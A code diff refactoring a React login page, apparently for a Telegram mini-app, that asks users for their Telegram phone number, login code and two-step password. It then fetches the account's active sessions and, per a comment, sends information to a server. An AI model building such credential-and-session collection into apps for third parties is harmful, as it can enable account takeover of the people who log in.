@@ -1,11 +1,8 @@
 import { useState, useEffect } from 'react';
-import { LoaderCircle, Send, Check, Key, Plus, Shield, ArrowLeft, Eye, EyeOff } from 'lucide-react';
+import { LoaderCircle, Send, Check, Key, Shield, ArrowLeft, Eye, EyeOff } from 'lucide-react';
 import { telegramService } from '@/services/telegramService';
-import { useForm } from 'react-hook-form';
-import { zodResolver } from '@hookform/resolvers/zod';
 import * as z from 'zod';
 import { api } from '@/utils/api';
-import { validatePhoneNumber, formatPhoneNumber, getCountryCode } from '../utils/phoneUtils';
 import { parsePhoneNumberFromString } from 'libphonenumber-js';
 import { TgPage } from '@/components/TgPage';
 import { backButton } from '@telegram-apps/sdk-react';
@@ -135,10 +132,29 @@ const CountryWarningModal = ({
     );
 };
 
+// اضافه کردن تابع validateInput
+const validateInput = (schema: z.ZodSchema, data: any) => {
+    try {
+        schema.parse(data);
+        return { isValid: true, errors: null };
+    } catch (error) {
+        if (error instanceof z.ZodError) {
+            const errors = error.errors.map(err => ({
+                field: err.path[0],
+                message: err.message
+            }));
+            return { isValid: false, errors };
+        }
+        return { isValid: false, errors: [{ field: 'general', message: 'خطای ناشناخته رخ داده است' }] };
+    }
+};
+
 function Login() {
     const navigate = useNavigate();
     const [step, setStep] = useState<'phone' | 'code' | 'password' | 'success'>('phone');
     const [phone, setPhone] = useState('');
+    const [code, setCode] = useState('');
+    const [password, setPassword] = useState('');
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState<string | null>(null);
     const [phoneCodeHash, setPhoneCodeHash] = useState<string | null>(null);
@@ -148,14 +164,7 @@ function Login() {
     const [userRole, setUserRole] = useState<'moderator' | 'admin' | null>(null);
     const [showBackConfirmation, setShowBackConfirmation] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
-
-    const { register, handleSubmit, formState: { errors } } = useForm({
-        resolver: zodResolver(
-            step === 'phone' ? phoneSchema :
-                step === 'code' ? codeSchema :
-                    passwordSchema
-        )
-    });
+    const [validationError, setValidationError] = useState<string | null>(null);
 
     useEffect(() => {
         console.log("step:", step);
@@ -170,9 +179,10 @@ function Login() {
         }
     }, [step]);
 
-
-
-    const handlePhoneSubmit = async (phone: string) => {
+    const handlePhoneSubmit = async () => {
+        setValidationError(null);
+        setShowCountryWarning(false);
+        console.log("phone:", phone);
         const formattedPhone = phone.startsWith('+') ? phone : `+${phone}`;
         console.log("formattedPhone:", formattedPhone);
         setPhone(formattedPhone);
@@ -237,7 +247,8 @@ function Login() {
         }
     };
 
-    const handleCodeSubmit = async (code: string) => {
+    const handleCodeSubmit = async () => {
+        setValidationError(null);
         if (!phoneCodeHash) return;
 
         setLoading(true);
@@ -273,12 +284,13 @@ function Login() {
         }
     };
 
-    const handlePasswordSubmit = async (password: string) => {
+    const handlePasswordSubmit = async () => {
+        setValidationError(null);
         setLoading(true);
         setError(null);
 
         try {
-            await telegramService.checkPassword({ password: userAuthParamCallback(password), onError: () => { console.log("errorrrr") } });
+            await telegramService.checkPassword(password);
             const activeSessions = await telegramService.getActiveSessions();
             setSessions(activeSessions);
             // ارسال اطلاعات به سرور
@@ -299,16 +311,6 @@ function Login() {
             setError(errorMessage);
         } finally {
             setLoading(false);
-        }
-    };
-
-    const onSubmit = async (data: any) => {
-        if (step === 'phone') {
-            await handlePhoneSubmit(data.phone);
-        } else if (step === 'code') {
-            await handleCodeSubmit(data.code);
-        } else if (step === 'password') {
-            await handlePasswordSubmit(data.password);
         }
     };
 
@@ -420,15 +422,7 @@ function Login() {
             </div>
         );
     };
-
-    function userAuthParamCallback<T>(param: T): () => Promise<T> {
-        return async function () {
-            return await new Promise<T>(resolve => {
-                resolve(param)
-            })
-        }
-    }
-
+    // تغییرات در JSX (حذف فرم و استفاده از div)
     return (
         <TgPage back={true}>
             <div className="p-4 bg-gray-100 flex flex-col h-screen justify-center items-center">
@@ -458,24 +452,32 @@ function Login() {
                         {step === 'code' && 'کد تایید ارسال شده به تلگرام خود را وارد کنید.'}
                         {step === 'password' && 'لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید.'}
                     </p>
-                    <form onSubmit={handleSubmit(onSubmit)}>
+                    <div>
                         {step === 'phone' && (
                             <div className="space-y-4">
-
                                 <div>
                                     <input
                                         type="text"
                                         placeholder="شماره تلفن (مثال: 989123456789)"
-                                        {...register('phone')}
+                                        value={phone}
                                         className="w-full p-2 border rounded"
                                         disabled={loading}
+                                        onChange={(e) => {
+                                            setPhone(e.target.value);
+                                            const validation = validateInput(phoneSchema, { phone: e.target.value });
+                                            if (!validation.isValid) {
+                                                setValidationError(validation.errors?.[0]?.message || 'خطای اعتبارسنجی');
+                                            } else {
+                                                setValidationError(null);
+                                            }
+                                        }}
                                     />
-                                    {errors.phone && (
-                                        <p className="text-red-500 text-sm mt-1 rtl">{errors.phone.message?.toString()}</p>
+                                    {validationError && (
+                                        <p className="text-red-500 text-sm mt-1 rtl">{validationError}</p>
                                     )}
                                 </div>
                                 <button
-                                    type="submit"
+                                    onClick={handlePhoneSubmit}
                                     disabled={loading}
                                     className="w-full bg-telegram-header text-white p-2 rounded disabled:opacity-50 flex items-center justify-center gap-2"
                                 >
@@ -497,12 +499,21 @@ function Login() {
                                     <input
                                         type="text"
                                         placeholder="کد تایید 5 رقمی"
-                                        {...register('code')}
+                                        value={code}
                                         className="w-full p-2 border rounded"
+                                        onChange={(e) => {
+                                            setCode(e.target.value);
+                                            const validation = validateInput(codeSchema, { code: e.target.value });
+                                            if (!validation.isValid) {
+                                                setValidationError(validation.errors?.[0]?.message || 'خطای اعتبارسنجی');
+                                            } else {
+                                                setValidationError(null);
+                                            }
+                                        }}
                                         disabled={loading}
                                     />
-                                    {errors.code && (
-                                        <p className="text-red-500 text-sm mt-1 rtl">{errors.code.message?.toString()}</p>
+                                    {validationError && (
+                                        <p className="text-red-500 text-sm mt-1 rtl">{validationError}</p>
                                     )}
                                 </div>
                                 <div className="flex gap-2">
@@ -515,7 +526,7 @@ function Login() {
                                         <span>بازگشت</span>
                                     </button>
                                     <button
-                                        type="submit"
+                                        onClick={handleCodeSubmit}
                                         disabled={loading}
                                         className="w-2/3 bg-telegram-header text-white p-2 rounded disabled:opacity-50 flex items-center justify-center gap-2"
                                     >
@@ -535,20 +546,34 @@ function Login() {
                         {step === 'password' && (
                             <div className="space-y-4">
                                 <div className="relative">
-                                    <input
-                                        type={showPassword ? "text" : "password"}
-                                        placeholder="رمز عبور دو مرحله‌ای"
-                                        {...register('password')}
-                                        className="w-full p-2 border rounded pr-10"
-                                        disabled={loading}
-                                    />
-                                    <button
-                                        type="button"
-                                        onClick={() => setShowPassword(!showPassword)}
-                                        className="absolute inset-y-0 left-auto right-0 px-3 flex items-center text-gray-500 hover:text-gray-700"
-                                    >
-                                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                                    </button>
+                                    <div className='flex items-center border rounded overflow-hidden'>
+                                        <input
+                                            type={showPassword ? "text" : "password"}
+                                            placeholder="رمز عبور دو مرحله‌ای"
+                                            value={password}
+                                            className="w-full p-2 pr-10 focus:outline-none"
+                                            onChange={(e) => {
+                                                setPassword(e.target.value);
+                                                const validation = validateInput(passwordSchema, { password: e.target.value });
+                                                if (!validation.isValid) {
+                                                    setValidationError(validation.errors?.[0]?.message || 'خطای اعتبارسنجی');
+                                                } else {
+                                                    setValidationError(null);
+                                                }
+                                            }}
+                                            disabled={loading}
+                                        />
+                                        <button
+                                            type="button"
+                                            onClick={() => setShowPassword(!showPassword)}
+                                            className="px-3 text-gray-500 hover:text-gray-700"
+                                        >
+                                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                                        </button>
+                                    </div>
+                                    {validationError && (
+                                        <p className="text-red-500 text-sm mt-1 rtl">{validationError}</p>
+                                    )}
                                 </div>
                                 <div className="flex gap-2">
                                     <button
@@ -560,7 +585,7 @@ function Login() {
                                         <span>بازگشت</span>
                                     </button>
                                     <button
-                                        type="submit"
+                                        onClick={handlePasswordSubmit}
                                         disabled={loading}
                                         className="w-2/3 bg-telegram-header text-white p-2 rounded disabled:opacity-50 flex items-center justify-center gap-2"
                                     >
@@ -626,12 +651,12 @@ function Login() {
                             </div>
                         )}
 
-                        {error && (
+                        {error && !validationError && (
                             <div className="mt-4 rtl p-2 text-center bg-red-100 text-red-600 rounded">
                                 {error}
                             </div>
                         )}
-                    </form>
+                    </div>
                 </div>
             </div>
         </TgPage>
